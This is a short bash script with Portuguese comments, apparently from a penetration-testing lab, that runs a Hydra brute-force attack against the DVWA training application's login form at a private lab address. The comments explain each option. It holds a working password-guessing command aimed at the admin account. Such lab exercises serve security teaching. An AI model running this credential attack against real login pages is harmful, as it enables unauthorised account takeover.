#!/bin/bash
# Script de Simulação de Ataque em Formulário Web (DVWA)
# Ferramenta: Hydra (Mais adequada para formulários HTML que o Medusa)
# Alvo: DVWA Login (IP Fictício: 192.168.56.101)

echo "[*] Iniciando ataque de força bruta em formulário Web (DVWA)..."
echo "[*] Alvo: http://192.168.56.101/dvwa/login.php"
echo "[*] Usuário: admin"
echo "[*] Wordlist: ../wordlists/common_passwords.txt"

# Comando Hydra
# -l: Usuário
# -P: Wordlist de senhas
# 192.168.56.101: IP do alvo
# http-post-form: Módulo para formulários POST
# "caminho:parametros:mensagem_erro": Sintaxe do Hydra para forms

# Exemplo de sintaxe para DVWA (ajustar conforme cookie/sessão real)
# Nota: Em um cenário real, é necessário capturar o PHPSESSID

hydra -l admin -P ../wordlists/common_passwords.txt 192.168.56.101 http-post-form "/dvwa/login.php:username=^USER^&password=^PASS^&Login=Login:Login failed"

echo "[*] Ataque finalizado."
